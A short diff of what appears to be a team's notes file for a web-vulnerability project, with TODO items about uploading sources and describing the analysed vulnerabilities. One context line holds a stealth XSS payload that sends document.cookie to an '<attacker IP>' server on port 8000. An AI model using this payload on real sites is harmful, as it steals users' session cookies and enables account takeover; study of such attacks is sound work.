@@ -19,7 +19,7 @@ More stealth, use this one
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
 
 ## TODO Filippo
-Upload source files
+~~Upload source files~~
 
 ## TODO Andrea & Dario
 1. describe the analyzed vulnerabilites (you can use external references)
